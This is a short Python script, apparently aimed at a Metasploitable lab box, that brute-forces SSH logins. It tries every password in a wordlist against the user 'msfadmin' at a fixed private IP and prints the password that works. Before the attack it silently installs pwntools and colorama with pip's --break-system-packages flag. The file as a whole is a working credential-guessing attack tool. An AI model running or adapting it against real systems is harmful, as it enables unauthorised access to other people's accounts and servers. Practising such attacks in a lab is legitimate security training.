#!/usr/bin/python3

RHOST = "192.168.167.66"
RPORT = 22
USERNAME = "msfadmin"
PASSFILE = "pass.txt"
a = 0

import urllib
import os
from os import system
import os.path
from urllib import request

check_path = 'requirements.txt'
check_file = os.path.isfile(check_path)
if check_file != True:
	with open("requirements.txt", "w") as q:
		q.write('pwntools\ncolorama\n')
	print('Downloading tools that are needed')
	local_file='requirements.txt'
	print('Installing requirements.txt')
	system("pip3 install -r requirements.txt --break-system-packages \n")

from pwn import *
import paramiko
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE
MAGENTA  = Fore.MAGENTA

Conv_RPORT = RPORT

print("\n\nUsername "f'{RED}'+USERNAME+ f'{RESET}'" being attacked on host "f'{BLUE}'+RHOST+ f'{RESET}'" with passfile "f'{GREEN}'+PASSFILE+ f'{RESET}' " on port" f'{MAGENTA}',(str(Conv_RPORT)))
print("\n")
with open(PASSFILE, "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			r = ssh(host=RHOST, port=RPORT, user=USERNAME, password=password, timeout=30)
			if r.connected():
				print(f'{GREEN}'"Your Password Sire: '{}'".format(password))
				r.close()
				break
			r.close()
		except paramiko.ssh_exception.AuthenticationException:
			a += 1
